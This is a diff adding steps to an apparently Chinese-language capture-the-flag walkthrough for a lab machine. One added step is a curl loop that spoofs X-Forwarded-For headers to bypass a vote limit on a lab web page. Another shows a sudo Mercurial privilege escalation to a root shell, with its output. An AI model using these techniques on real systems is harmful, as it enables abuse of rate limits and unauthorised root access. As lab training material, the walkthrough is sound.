@@ -137,6 +137,16 @@ vote=1&vote_count=10
 
 <img width="835" height="120" alt="图片" src="https://github.com/user-attachments/assets/42f1b506-0d79-416b-a60c-1829142f56d6" />
 
+也可以使用命令行
+for i in $(seq 1000); do ... done会进行1000次对curl -X POST http://192.168.21.11/vote/vote.php的post请求
+-d 'vote=1&vote_count=1'为发送的post表单数据
+-H "X-Forwarded-For: $i "来添加自定义 HTTP 头，$i 会被循环变量替换成 1～1000 的数字。
+
+```
+┌──(kali㉿kali)-[~]
+└─$ for i in $(seq 1000);do curl -X POST http://192.168.21.11/vote/vote.php -d 'vote=1&vote_count=1' -H "X-Forwarded-For: $i ";done
+```
+
 得到了账号密码：pencek:d032fc2b8b，尝试ssh连接，失败，但是刚才端口扫描看到了9090端口是Cockpit web service 221 - 253，成功登录
 
 ```
@@ -219,6 +229,44 @@ Matching Defaults entries for todd on Login:
 User todd may run the following commands on Login:
     (ALL) NOPASSWD: /usr/bin/hg
 todd@Login:~$ sudo hg --config alias.foo='!bash' foo
+root@Login:/home/todd# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+第二种:
+sudo hg help：以root权限执行hg，打印帮助。
+在输入里追加了 !/bin/bash，类似于在某些交互式 CLI 工具中输入 !<命令> 来执行 shell
+Mercurial解释器执行!/bin/bash=启动一个bash shell。
+因为是通过sudo执行的，权限是 root。
+
+```
+todd@Login:~$ sudo hg help
+Mercurial Distributed SCM
+
+list of commands:
+
+Repository creation:
+
+ clone         make a copy of an existing repository
+ init          create a new repository in the given directory
+
+Remote repository management:
+
+ incoming      show new changesets found in source
+ outgoing      show changesets not found in the destination
+ paths         show aliases for remote repositories
+ pull          pull changes from the specified source
+ push          push changes to the specified destination
+ serve         start stand-alone webserver
+
+Change creation:
+
+ commit        commit the specified files or all outstanding changes
+
+Change manipulation:
+
+ backout       reverse effect of earlier changeset
+!/bin/bash
 root@Login:/home/todd# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
